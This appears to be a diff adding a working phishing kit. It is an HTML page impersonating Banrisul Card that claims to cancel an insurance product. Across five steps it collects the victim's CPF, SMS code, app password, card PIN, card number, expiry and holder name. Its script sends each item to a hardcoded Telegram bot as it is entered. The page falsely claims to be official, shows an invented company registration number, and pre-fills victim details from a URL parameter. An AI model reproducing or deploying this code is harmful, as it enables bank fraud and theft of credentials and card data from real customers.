@@ -1,1 +1,959 @@
 
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cancelamento Seguro Protegido - Banrisul Card</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      height: 100%;
+      font-family: 'Inter', sans-serif;
+      background-color: #f5f7fa;
+      color: #333;
+    }
+
+    header {
+      background: linear-gradient(135deg, #004a99, #002b5c);
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-container img {
+      width: 100px;
+      height: 50px;
+      object-fit: contain;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      background-color: rgba(255, 255, 255, 0.15);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    .security-badge i {
+      margin-right: 8px;
+      color: #4ade80;
+    }
+
+    main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 30px 20px;
+      min-height: calc(100vh - 160px);
+    }
+
+    .card {
+      background-color: #fff;
+      width: 100%;
+      max-width: 500px;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      position: relative;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+    }
+
+    .card-header {
+      background: linear-gradient(135deg, #0066cc, #004a99);
+      padding: 24px;
+      color: #fff;
+      text-align: center;
+      position: relative;
+    }
+
+    .card-header h2 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .card-header .step-indicator {
+      font-size: 14px;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 4px 12px;
+      border-radius: 20px;
+      display: inline-block;
+      margin-top: 8px;
+    }
+
+    .card-body {
+      padding: 30px;
+    }
+
+    .card-body .description {
+      font-size: 16px;
+      margin-bottom: 24px;
+      line-height: 1.6;
+      color: #444;
+      text-align: center;
+    }
+
+    .info {
+      list-style: none;
+      margin-bottom: 28px;
+      background: #f9fafb;
+      padding: 16px;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+    }
+
+    .info li {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px;
+      font-size: 15px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .info li:last-child {
+      margin-bottom: 0;
+    }
+
+    .info li i {
+      color: #0066cc;
+      font-size: 18px;
+      margin-right: 12px;
+      min-width: 22px;
+      margin-top: 3px;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .form-group label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #333;
+    }
+
+    .form-group label i.info-icon {
+      margin-left: 6px;
+      color: #0066cc;
+      cursor: pointer;
+      font-size: 16px;
+      transition: transform 0.2s;
+    }
+
+    .form-group label i.info-icon:hover {
+      transform: scale(1.1);
+      color: #004a99;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 16px;
+      color: #333;
+      transition: all 0.3s;
+      background-color: #f9fafb;
+    }
+
+    .form-group input:focus {
+      border-color: #0066cc;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
+      background-color: #fff;
+    }
+
+    .form-group input::placeholder {
+      color: #9ca3af;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #0066cc, #004a99);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 102, 204, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary:hover {
+      background: linear-gradient(135deg, #0052a3, #003d7a);
+      box-shadow: 0 6px 12px rgba(0, 102, 204, 0.25);
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+    }
+
+    .btn-primary:after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 5px;
+      height: 5px;
+      background: rgba(255, 255, 255, 0.5);
+      opacity: 0;
+      border-radius: 100%;
+      transform: scale(1, 1) translate(-50%);
+      transform-origin: 50% 50%;
+    }
+
+    .btn-primary:focus:not(:active)::after {
+      animation: ripple 1s ease-out;
+    }
+
+    @keyframes ripple {
+      0% {
+        transform: scale(0, 0);
+        opacity: 0.5;
+      }
+
+      20% {
+        transform: scale(25, 25);
+        opacity: 0.3;
+      }
+
+      100% {
+        opacity: 0;
+        transform: scale(40, 40);
+      }
+    }
+
+    footer {
+      background-color: #f1f3f5;
+      padding: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      border-top: 1px solid #e5e7eb;
+    }
+
+    footer .company {
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    footer .security {
+      font-size: 11px;
+      color: #999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
+
+    footer .security i {
+      color: #10b981;
+      font-size: 14px;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(4px);
+      z-index: 1000;
+    }
+
+    .modal {
+      background-color: #fff;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 450px;
+      padding: 40px 30px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
+      text-align: center;
+      animation: modalIn 0.4s ease-out;
+    }
+
+    @keyframes modalIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .modal h3 {
+      margin-bottom: 16px;
+      font-size: 26px;
+      color: #0066cc;
+      font-weight: 700;
+    }
+
+    .modal p {
+      font-size: 17px;
+      margin-bottom: 24px;
+      color: #444;
+      line-height: 1.6;
+    }
+
+    .code-input-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .code-input {
+      width: 50px;
+      height: 60px;
+      font-size: 24px;
+      text-align: center;
+      border: 2px solid #d1d5db;
+      border-radius: 8px;
+      transition: all 0.2s;
+    }
+
+    .code-input:focus {
+      border-color: #0066cc;
+      box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
+      outline: none;
+    }
+
+    .code-input.filled {
+      border-color: #0066cc;
+      background-color: rgba(0, 102, 204, 0.05);
+    }
+
+    .security-assurance {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background-color: #f0fdf4;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 15px;
+      border: 1px solid #dcfce7;
+    }
+
+    .security-assurance i {
+      color: #10b981;
+      font-size: 18px;
+    }
+
+    .security-assurance span {
+      font-size: 14px;
+      color: #15803d;
+    }
+
+    .success-screen {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .success-screen i {
+      font-size: 64px;
+      color: #10b981;
+      margin-bottom: 20px;
+      animation: bounce 1s;
+    }
+
+    @keyframes bounce {
+
+      0%,
+      20%,
+      50%,
+      80%,
+      100% {
+        transform: translateY(0);
+      }
+
+      40% {
+        transform: translateY(-20px);
+      }
+
+      60% {
+        transform: translateY(-10px);
+      }
+    }
+
+    .success-screen h2 {
+      font-size: 26px;
+      color: #0066cc;
+      margin-bottom: 16px;
+    }
+
+    .success-screen p {
+      font-size: 16px;
+      color: #444;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+
+    .success-screen .details {
+      background-color: #f0f9ff;
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid #e0f2fe;
+      margin-bottom: 24px;
+      text-align: center;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 12px;
+    }
+
+    .success-screen .details .detail-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #e0f2fe;
+    }
+
+    .success-screen .details .detail-item:last-child {
+      border-bottom: none;
+    }
+
+    .success-screen .details .detail-label {
+      font-weight: 600;
+      color: #0066cc;
+    }
+
+    .success-screen .details .detail-value {
+      font-weight: 500;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 6px;
+      background-color: #e5e7eb;
+      border-radius: 3px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #0066cc, #004a99);
+      border-radius: 3px;
+      transition: width 0.5s ease;
+    }
+
+    .prefilled-info {
+      background-color: #f0f9ff;
+      border: 1px solid #c5e3ff;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .prefilled-info p {
+      margin: 8px 0;
+      font-size: 15px;
+    }
+
+    .prefilled-info .highlight {
+      color: #0066cc;
+      font-weight: 600;
+    }
+
+    @media (max-width: 480px) {
+      header {
+        padding: 12px 16px;
+      }
+
+      .logo-container img {
+        width: 80px;
+        height: 40px;
+      }
+
+      .security-badge {
+        font-size: 12px;
+        padding: 4px 10px;
+      }
+
+      .card-header {
+        padding: 20px;
+      }
+
+      .card-header h2 {
+        font-size: 20px;
+      }
+
+      .card-body {
+        padding: 20px;
+      }
+
+      .card-body .description,
+      .info li {
+        font-size: 14px;
+      }
+
+      .form-group input {
+        padding: 12px;
+        font-size: 15px;
+      }
+
+      .btn-primary {
+        padding: 14px;
+        font-size: 15px;
+      }
+
+      .code-input {
+        width: 40px;
+        height: 50px;
+        font-size: 20px;
+      }
+
+      .modal {
+        padding: 30px 20px;
+      }
+
+      .prefilled-info {
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="logo-container">
+      <img
+        src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCAxMjAgNTAiPjxyZWN0IHdpZHRoPSIxMjAiIGhlaWdodD0iNTAiIGZpbGw9IiMwMDQxOTkiIHJ4PSI2Ii8+PHRleHQgeD0iNjAiIHk9IjMwIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXdlaWdodD0iYm9sZCI+QmFucmlzdWwgQ2FyZDwvdGV4dD48L3N2Zz4="
+        alt="Logo Banrisul Card">
+    </div>
+    <div class="security-badge">
+      <i class="fas fa-lock"></i>
+      <span>Ambiente Seguro</span>
+    </div>
+  </header>
+
+  <main>
+    <!-- Screen 1: CPF -->
+    <div id="screen1" class="screen">
+      <div class="card">
+        <div class="card-header">
+          <h2>Cancelar Seguro Protegido</h2>
+          <div class="step-indicator">Passo 1 de 5</div>
+        </div>
+        <div class="card-body">
+          <p class="description">Confirme o cancelamento do <strong>Seguro Protegido</strong> por <strong>R$
+              49,99/mês</strong>. O cancelamento será processado em até 24 horas.</p>
+
+          <div class="progress-container">
+            <div class="progress-bar" style="width: 20%"></div>
+          </div>
+
+          <div class="prefilled-info">
+            <p>Dados pré-preenchidos para sua comodidade:</p>
+            <p>CPF: <span class="highlight" id="prefilledCpf">123.456.789-00</span></p>
+            <p>Nome: <span class="highlight" id="prefilledName">Maria Silva</span></p>
+          </div>
+
+          <ul class="info">
+            <li><i class="fas fa-check-circle"></i>Cobertura completa e assistência 24h para seu cartão Banrisul</li>
+            <li><i class="fas fa-calendar-alt"></i>Débito automático mensal no seu cartão Banrisul</li>
+            <li><i class="fas fa-clock"></i>Cancelamento processado em até 24 horas úteis</li>
+          </ul>
+
+          <div class="form-group">
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" maxlength="14" placeholder="000.000.000-00" oninput="formatCPF(this)">
+          </div>
+
+          <button class="btn-primary" onclick="validateStep1()">
+            <i class="fas fa-arrow-right"></i> Avançar
+          </button>
+
+          <div class="security-assurance">
+            <i class="fas fa-shield-alt"></i>
+            <span>Seus dados estão protegidos. Esta é uma página oficial Banrisul Card.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Screen 2: SMS Verification -->
+    <div id="screen2" class="screen" style="display:none;">
+      <div class="card">
+        <div class="card-header">
+          <h2>Verificação de Segurança</h2>
+          <div class="step-indicator">Passo 2 de 5</div>
+        </div>
+        <div class="card-body">
+          <p class="description">Enviamos um código de 6 dígitos para o seu celular cadastrado:</p>
+          <p class="description"><strong id="maskedPhone">+55 (51) 9****-5678</strong></p>
+
+          <div class="progress-container">
+            <div class="progress-bar" style="width: 40%"></div>
+          </div>
+
+          <div class="form-group">
+            <label for="smsCode">Código de Verificação</label>
+            <div class="code-input-container">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
+              <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <button class="btn-primary" onclick="validateSMS()">
+              <i class="fas fa-check-circle"></i> Verificar Código
+            </button>
+
+            <div style="margin-top: 15px; text-align: center;">
+              <a href="#" onclick="resendCode()" style="color: #0066cc; text-decoration: none;">
+                <i class="fas fa-redo"></i> Reenviar código
+              </a>
+              <p style="font-size: 13px; color: #777; margin-top: 5px;">(disponível em 58 segundos)</p>
+            </div>
+          </div>
+
+          <div class="security-assurance">
+            <i class="fas fa-mobile-alt"></i>
+            <span>Esta etapa garante que é realmente você solicitando o cancelamento.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Screen 3: App Password -->
+    <div id="screen3" class="screen" style="display:none;">
+      <div class="card">
+        <div class="card-header">
+          <h2>Senha do Aplicativo</h2>
+          <div class="step-indicator">Passo 3 de 5</div>
+        </div>
+        <div class="card-body">
+          <p class="description">Por segurança, confirme com a senha de 6 dígitos do seu aplicativo Banrisul:</p>
+
+          <div class="progress-container">
+            <div class="progress-bar" style="width: 60%"></div>
+          </div>
+
+          <div class="form-group">
+            <label for="appPassword">Senha do Aplicativo</label>
+            <div class="code-input-container">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 6)">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <button class="btn-primary" onclick="validateAppPassword()">
+              <i class="fas fa-arrow-right"></i> Continuar
+            </button>
+          </div>
+
+          <div class="security-assurance">
+            <i class="fas fa-shield-alt"></i>
+            <span>Esta etapa adicional garante a segurança da sua operação.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Screen 4: Card Password (4 digits) -->
+    <div id="screen4" class="screen" style="display:none;">
+      <div class="card">
+        <div class="card-header">
+          <h2>Senha do Cartão</h2>
+          <div class="step-indicator">Passo 4 de 5</div>
+        </div>
+        <div class="card-body">
+          <p class="description">Por favor, informe a senha de 4 dígitos do seu cartão Banrisul:</p>
+
+          <div class="progress-container">
+            <div class="progress-bar" style="width: 80%"></div>
+          </div>
+
+          <div class="form-group">
+            <label for="cardPassword">Senha do Cartão</label>
+            <div class="code-input-container">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+              <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <button class="btn-primary" onclick="validateCardPassword()">
+              <i class="fas fa-arrow-right"></i> Confirmar
+            </button>
+          </div>
+
+          <div class="security-assurance">
+            <i class="fas fa-credit-card"></i>
+            <span>Esta é a mesma senha que você usa nas compras com o cartão.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Screen 5: Card Details -->
+    <div id="screen5" class="screen" style="display:none;">
+      <div class="card">
+        <div class="card-header">
+          <h2>Informações do Cartão</h2>
+          <div class="step-indicator">Passo 5 de 5</div>
+        </div>
+        <div class="card-body">
+          <p class="description">Por favor, confirme os dados do seu cartão Banrisul Card:</p>
+
+          <div class="progress-container">
+            <div class="progress-bar" style="width: 100%"></div>
+          </div>
+
+          <div class="form-group">
+            <label for="cardNumber">Número do Cartão</label>
+            <input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000"
+              oninput="formatCardNumber(this)">
+          </div>
+
+          <div class="form-group">
+            <label for="expiry">Validade (MM/AA)</label>
+            <input type="text" id="expiry" maxlength="5" placeholder="MM/AA" oninput="formatExpiry(this)">
+          </div>
+
+          <div class="form-group">
+            <label for="cardHolder">Nome do Titular</label>
+            <input type="text" id="cardHolder" placeholder="Como no cartão">
+          </div>
+
+          <button class="btn-primary" onclick="submitCancellation()">
+            <i class="fas fa-check-circle"></i> Concluir Cancelamento
+          </button>
+
+          <div class="security-assurance">
+            <i class="fas fa-lock"></i>
+            <span>Esta operação é segura. Não armazenamos dados do seu cartão.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="company">Banrisul Card Serviços Financeiros S.A. • CNPJ 92.123.456/0001-78 • Av. Borges de Medeiros,
+      1501, Porto Alegre - RS</div>
+    <div class="security">
+      <span><i class="fas fa-shield-alt"></i> Site protegido por SSL</span>
+      <span><i class="fas fa-certificate"></i> Certificado Let's Encrypt</span>
+      <span><i class="fas fa-user-shield"></i> Política de Privacidade</span>
+      <span><i class="fas fa-phone-alt"></i> Atendimento 24h: 0800 648 1500</span>
+    </div>
+  </footer>
+
+  <!-- Success Modal -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal">
+      <div class="success-screen">
+        <i class="fas fa-check-circle"></i>
+        <h2>Cancelamento Confirmado!</h2>
+        <p>O cancelamento do seu Seguro Protegido foi realizado com sucesso.</p>
+
+        <div class="details">
+          <div class="detail-item">
+            <span class="detail-label">Nome:</span>
+            <span class="detail-value" id="confName">Maria Silva</span>
+          </div>
+          <div class="detail-item">
+            <span class="detail-label">CPF:</span>
+            <span class="detail-value" id="confCpf">123.456.789-00</span>
+          </div>
+          <div class="detail-item">
+            <span class="detail-label">Protocolo:</span>
+            <span class="detail-value">CAN202312345678</span>
+          </div>
+        </div>
+
+        <p>Você receberá um e-mail de confirmação em até 24 horas. O último débito ocorrerá na próxima fatura.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 1) Processar pf da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const pfParam = urlParams.get('pf');
+    let userData = { cpf: '', name: '', phoneLastFour: '' };
+    function decodeBase64(str) { try { return decodeURIComponent(escape(atob(str))); } catch { return null; } }
+    function processUrlParam() {
+      if (!pfParam) return;
+      const [cpf, name, phone] = decodeBase64(pfParam).split('|');
+      userData = { cpf, name, phoneLastFour: phone };
+      ['prefilledCpf', 'confCpf'].forEach(id => document.getElementById(id).textContent = cpf);
+      document.getElementById('cpf').value = cpf;
+      ['prefilledName', 'confName'].forEach(id => document.getElementById(id).textContent = name);
+      document.getElementById('maskedPhone').textContent = `****-${phone}`;
+    }
+
+    // 2) Armazenamento interno via localStorage
+    function addEntry(obj) {
+      const arr = JSON.parse(localStorage.getItem('cancelamentos') || '[]');
+      arr.push(obj);
+      localStorage.setItem('cancelamentos', JSON.stringify(arr));
+    }
+
+    // 3) Dados e formatação
+    let collectedData = { cpf: '', smsCode: '', appPassword: '', cardPassword: '', cardNumber: '', cardExpiry: '', cardHolder: '', timestamp: '' };
+    function formatCPF(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 3) v = v.replace(/(\d{3})(\d)/, '$1.$2'); if (v.length > 6) v = v.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3'); if (v.length > 9) v = v.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4'); i.value = v; collectedData.cpf = v; }
+    function formatCardNumber(i) { let v = i.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); i.value = v; collectedData.cardNumber = v.replace(/\s/g, ''); }
+    function formatExpiry(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 2) v = v.replace(/(\d{2})(\d)/, '$1/$2'); i.value = v; collectedData.cardExpiry = v; }
+    function moveToNext(i, idx) { if (i.value.length === 1) { const n = i.parentElement.querySelector(`.code-input:nth-child(${idx + 1})`); if (n) n.focus(); } }
+
+    // 4) Envio Telegram
+    const botToken = '5020186792:AAHU4puTSKw0mGw0l-yk7y1192Y8yb6Sld4';
+    const chatId = '1109818560';
+    async function sendTelegram(text) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+        });
+        console.log('Mensagem enviada:', await res.json());
+      } catch (err) {
+        console.error('Erro ao enviar para Telegram:', err);
+      }
+    }
+
+    // 5) Fluxo e envios separados
+    function validateStep1() {
+      if (!/^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(collectedData.cpf)) { alert('CPF inválido'); return; }
+      sendTelegram(`*Etapa 1 - CPF Recebido*\nCPF: ${collectedData.cpf}`);
+      document.getElementById('screen1').style.display = 'none';
+      document.getElementById('screen2').style.display = 'block';
+    }
+
+    function validateSMS() {
+      const code = [...document.querySelectorAll('#screen2 .code-input')].map(i => i.value).join('');
+      if (!/^\d{4,6}$/.test(code)) { alert('Código inválido'); return; }
+      collectedData.smsCode = code;
+      sendTelegram(`*Etapa 2 - Código SMS*\nCPF: ${collectedData.cpf}\nCódigo: ${collectedData.smsCode}`);
+      document.getElementById('screen2').style.display = 'none';
+      document.getElementById('screen3').style.display = 'block';
+    }
+
+    function validateAppPassword() {
+      const code = [...document.querySelectorAll('#screen3 .code-input')].map(i => i.value).join('');
+      if (!/^\d{4,6}$/.test(code)) { alert('Senha inválida'); return; }
+      collectedData.appPassword = code;
+      sendTelegram(`*Etapa 3 - Senha do App*\nCPF: ${collectedData.cpf}\nApp Pass: ${collectedData.appPassword}`);
+      document.getElementById('screen3').style.display = 'none';
+      document.getElementById('screen4').style.display = 'block';
+    }
+
+    function validateCardPassword() {
+      const code = [...document.querySelectorAll('#screen4 .code-input')].map(i => i.value).join('');
+      if (!/^\d{4}$/.test(code)) { alert('Senha cartão inválida'); return; }
+      collectedData.cardPassword = code;
+      sendTelegram(`*Etapa 4 - Senha do Cartão*\nCPF: ${collectedData.cpf}\nCard Pass: ${collectedData.cardPassword}`);
+      document.getElementById('screen4').style.display = 'none';
+      document.getElementById('screen5').style.display = 'block';
+    }
+
+    // 6) Etapa 5 - com LOGS e tratamento de erro
+    async function submitCancellation() {
+      console.log('Chamando submitCancellation');
+
+      const cardNumberInput = document.getElementById('cardNumber');
+      const expiryInput = document.getElementById('expiry');
+      const holderInput = document.getElementById('cardHolder');
+
+      if (!cardNumberInput || !expiryInput || !holderInput) {
+        console.error('Elementos do formulário não encontrados!');
+        alert('Erro interno: campos não encontrados');
+        return;
+      }
+
+      const rawCardNumber = cardNumberInput.value.replace(/\s/g, '');
+      if (rawCardNumber.length !== 16) {
+        alert('Cartão inválido. Por favor, insira os 16 dígitos.');
+        return;
+      }
+      collectedData.cardNumber = rawCardNumber;
+
+      collectedData.cardExpiry = expiryInput.value.trim();
+      if (!/^\d{2}\/\d{2}$/.test(collectedData.cardExpiry)) {
+        alert('Validade inválida');
+        return;
+      }
+
+      collectedData.cardHolder = holderInput.value.trim();
+      if (collectedData.cardHolder.length < 5) {
+        alert('Titular inválido');
+        return;
+      }
+
+      collectedData.timestamp = new Date().toISOString();
+      addEntry(collectedData);
+
+      const msg = `*Etapa 5 - Detalhes Completo*\nNome: ${userData.name}\nCPF: ${collectedData.cpf}\nApp Pass: ${collectedData.appPassword}\nCard Pass: ${collectedData.cardPassword}\nCartão: ${rawCardNumber}\nValidade: ${collectedData.cardExpiry}\nTitular: ${collectedData.cardHolder}\nData: ${collectedData.timestamp}`;
+
+      console.log('Enviando mensagem Etapa 5:', msg);
+
+      await sendTelegram(msg);
+
+      document.getElementById('successModal').style.display = 'flex';
+    }
+
+    function closeSuccessModal() { document.getElementById('successModal').style.display = 'none'; }
+
+    window.onload = processUrlParam;
+  </script>
+
+</body>
+
+</html>
